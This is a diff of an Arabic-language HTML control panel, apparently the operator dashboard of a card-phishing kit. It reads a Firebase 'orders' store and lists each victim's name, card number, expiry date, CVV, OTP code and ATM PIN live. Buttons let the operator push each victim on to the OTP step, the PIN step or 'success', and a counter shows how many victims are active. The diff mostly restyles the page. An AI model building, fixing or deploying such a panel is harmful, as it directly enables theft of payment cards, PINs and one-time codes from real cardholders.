@@ -3,44 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم الرادار الموحد</title>
+    <title>لوحة تحكم العمليات - نظام الرادار</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     
     <style>
-        :root { --main-green: #1e7344; --dark-bg: #0a0a0a; --accent: #ffd700; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--dark-bg); color: #e0e0e0; margin: 0; padding: 10px; }
+        :root { 
+            --main-green: #1e7344; 
+            --bg-gray: #f0f2f5; /* لون رمادي فاتح للخلفية */
+            --card-bg: #ffffff; /* لون أبيض للخلايا والبطاقات */
+            --text-dark: #333333;
+        }
+        
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background-color: var(--bg-gray); 
+            color: var(--text-dark); 
+            margin: 0; 
+            padding: 15px; 
+        }
         
         .header { 
-            background: #151515; padding: 15px 25px; display: flex; justify-content: space-between; 
-            align-items: center; border-bottom: 3px solid var(--main-green); margin-bottom: 15px; border-radius: 10px;
+            background: #fff; 
+            padding: 15px 25px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            border-bottom: 4px solid var(--main-green); 
+            margin-bottom: 20px; 
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
 
         .stats-box { display: flex; gap: 20px; align-items: center; }
         .live-indicator {
-            background: rgba(46, 204, 113, 0.1); border: 1px solid #2ecc71;
-            padding: 8px 15px; border-radius: 8px; color: #2ecc71; font-weight: bold;
-            display: flex; align-items: center; gap: 8px;
+            background: rgba(30, 115, 68, 0.1); 
+            border: 1px solid var(--main-green);
+            padding: 8px 18px; 
+            border-radius: 50px; 
+            color: var(--main-green); 
+            font-weight: bold;
+            display: flex; 
+            align-items: center; 
+            gap: 10px;
         }
-        .pulse { width: 10px; height: 10px; background: #2ecc71; border-radius: 50%; box-shadow: 0 0 8px #2ecc71; animation: pulse-animation 1.5s infinite; }
+        .pulse { width: 12px; height: 12px; background: #2ecc71; border-radius: 50%; animation: pulse-animation 1.5s infinite; }
         @keyframes pulse-animation { 0% { transform: scale(0.9); opacity: 1; } 50% { transform: scale(1.2); opacity: 0.5; } 100% { transform: scale(0.9); opacity: 1; } }
 
-        .table-container { width: 100%; overflow-x: auto; background: #151515; border-radius: 12px; }
+        .table-container { 
+            width: 100%; 
+            overflow-x: auto; 
+            background: #fff; 
+            border-radius: 15px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+        
         table { width: 100%; border-collapse: collapse; min-width: 1200px; }
-        th { background: #202020; color: #999; padding: 15px; text-align: center; font-size: 13px; border-bottom: 2px solid #333; }
-        td { padding: 12px; text-align: center; border-bottom: 1px solid #222; font-size: 15px; }
+        th { background: #f8f9fa; color: #666; padding: 18px; text-align: center; font-size: 13px; border-bottom: 2px solid #eee; }
+        td { padding: 15px; text-align: center; border-bottom: 1px solid #f1f1f1; font-size: 15px; color: #444; }
         
-        /* حل مشكلة تشقلب رقم البطاقة */
-        .card-num-cell { direction: ltr !important; unicode-bidi: bidi-override; font-family: 'Courier New', monospace; font-weight: bold; color: #fff; letter-spacing: 1px; }
+        /* معالجة رقم البطاقة لعدم الانعكاس */
+        .card-num-cell { 
+            direction: ltr !important; 
+            unicode-bidi: bidi-override; 
+            font-family: 'Courier New', monospace; 
+            font-weight: bold; 
+            color: #1e7344; 
+            letter-spacing: 1px;
+            background: #f9f9f9;
+            padding: 5px;
+            border-radius: 4px;
+        }
         
-        .page-name { color: var(--accent); font-size: 12px; font-weight: bold; background: #252525; padding: 4px 8px; border-radius: 4px; }
-        .otp-val { color: #00ff88; font-size: 18px; font-weight: bold; }
-        .pin-val { color: #ffeb3b; font-size: 18px; font-weight: bold; }
+        .page-name { color: #856404; font-size: 11px; font-weight: bold; background: #fff3cd; padding: 5px 10px; border-radius: 20px; border: 1px solid #ffeeba; }
+        .otp-val { color: #d9534f; font-size: 18px; font-weight: bold; }
+        .pin-val { color: #f0ad4e; font-size: 18px; font-weight: bold; }
 
-        .btn { padding: 10px 20px; border: none; border-radius: 6px; font-weight: bold; transition: 0.3s; cursor: pointer; font-size: 13px; }
-        .btn-off { background: #333 !important; color: #666 !important; cursor: not-allowed; }
-        .btn-accept.active { background: #2ecc71 !important; color: #fff; }
-        .btn-reject.active { background: #e74c3c !important; color: #fff; }
+        .btn { padding: 10px 22px; border: none; border-radius: 8px; font-weight: bold; transition: 0.3s; cursor: pointer; font-size: 13px; }
+        
+        /* الحالة الرمادية */
+        .btn-off { background: #e0e0e0 !important; color: #999 !important; cursor: not-allowed; }
+        
+        /* الحالة النشطة */
+        .btn-accept.active { background: #2ecc71 !important; color: #fff; box-shadow: 0 4px 10px rgba(46, 204, 113, 0.3); }
+        .btn-reject.active { background: #e74c3c !important; color: #fff; box-shadow: 0 4px 10px rgba(231, 76, 60, 0.3); }
+
+        tr:hover { background-color: #fafafa; }
     </style>
 </head>
 <body onload="_init()">
@@ -49,13 +97,13 @@
 
 <div class="header">
     <div class="stats-box">
-        <strong style="font-size: 20px; color: var(--main-green);">Saso Radar</strong>
+        <strong style="font-size: 22px; color: var(--main-green);">نظام إدارة العمليات</strong>
         <div class="live-indicator">
             <div class="pulse"></div>
-            العملاء النشطون الآن: <span id="visitor_count" style="font-size: 20px; margin-right: 5px;">0</span>
+            <span>العملاء النشطون حالياً: <b id="visitor_count" style="font-size: 22px; margin-right: 5px;">0</b></span>
         </div>
     </div>
-    <button onclick="_clear()" style="background:#c0392b; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير السجلات</button>
+    <button onclick="_clear()" style="background:#dc3545; color:white; border:none; padding:10px 20px; border-radius:8px; cursor:pointer; font-weight:bold;">تصفير السجلات</button>
 </div>
 
 <div class="table-container">
@@ -63,16 +111,17 @@
         <thead>
             <tr>
                 <th>#</th>
-                <th>مكان العميل</th>
-                <th>الاسم</th>
-                <th>رقم البطاقة (من اليسار)</th>
-                <th>التاريخ / CVV</th>
-                <th>الرمز (OTP)</th>
+                <th>الموقع الحالي</th>
+                <th>اسم صاحب البطاقة</th>
+                <th>رقم البطاقة (LTR)</th>
+                <th>تاريخ / CVV</th>
+                <th>رمز الـ OTP</th>
                 <th>ATM PIN</th>
-                <th>الإجراء</th>
+                <th>الإجراء السريع</th>
             </tr>
         </thead>
-        <tbody id="monitor"></tbody>
+        <tbody id="monitor">
+            </tbody>
     </table>
 </div>
 
@@ -84,20 +133,18 @@
         if (!firebase.apps.length) firebase.initializeApp(config);
         const db = firebase.database();
 
-        // تحديث عداد الزيارات الحية (Real-time)
+        // تحديث العداد الفعلي للزوار النشطين
         db.ref('orders').on('value', snap => {
             const data = snap.val() || {};
             const now = new Date().getTime();
             let active = 0;
-            
             Object.values(data).forEach(item => {
-                // لو العميل لسه فاتح أو حدث بياناته في آخر دقيقة
                 if (item.last_update && (now - item.last_update < 60000)) active++;
             });
             document.getElementById('visitor_count').innerText = active;
         });
 
-        // مراقبة العمليات
+        // مراقبة وصول البيانات
         db.ref('orders').on('value', snapshot => {
             const orders = snapshot.val() || {};
             const monitor = document.getElementById('monitor');
@@ -108,7 +155,6 @@
                 const d = orders[id];
                 const count = ids.length - index;
 
-                // نظام التنبيه الصوتي
                 const currentStr = JSON.stringify(d);
                 let hasNewMove = false;
                 if(cache[id] && cache[id] !== currentStr) {
@@ -117,22 +163,22 @@
                 }
                 cache[id] = currentStr;
 
-                // تحديد المسار القادم
+                // تحديد التوجيه القادم
                 let next = 'go_to_otp';
                 if (d.otp_code || d.otp) next = 'go_to_pin';
                 if (d.atm_pin) next = 'success';
 
-                // حالة الزرار: ينور لو العميل مبعوت له أمر انتظار أو لسه باعت داتا
+                // منطق تفعيل الأزرار
                 const canAct = (d.next_step === 'waiting' || hasNewMove);
                 const btnStyle = canAct ? 'active' : 'btn-off';
 
                 const row = `
                     <tr>
-                        <td>${count}</td>
-                        <td><span class="page-name">${d.current_page || 'البداية'}</span></td>
-                        <td style="font-weight:bold;">${d.fullName || '---'}</td>
+                        <td><b>${count}</b></td>
+                        <td><span class="page-name">${d.current_page || 'انتظار..'}</span></td>
+                        <td style="font-weight:600;">${d.fullName || '---'}</td>
                         <td class="card-num-cell">${d.cardNumber || '---'}</td>
-                        <td>${d.expiryDate || '--/--'} | ${d.cvv || '---'}</td>
+                        <td><span style="background:#eee; padding:2px 6px; border-radius:4px;">${d.expiryDate || '--/--'}</span> | <b>${d.cvv || '---'}</b></td>
                         <td class="otp-val">${d.otp_code || d.otp || '----'}</td>
                         <td class="pin-val">${d.atm_pin || '----'}</td>
                         <td>
@@ -150,12 +196,12 @@
         firebase.database().ref('orders/' + id).update({ 
             next_step: step,
             last_command_time: new Date().getTime(),
-            last_update: new Date().getTime() // عشان يفضل محسوب في الزيارات النشطة
+            last_update: new Date().getTime()
         });
     }
 
     function _clear() {
-        if(confirm("مسح كافة السجلات؟")) firebase.database().ref('orders').remove();
+        if(confirm("هل أنت متأكد من مسح جميع السجلات؟")) firebase.database().ref('orders').remove();
     }
 </script>
 </body>
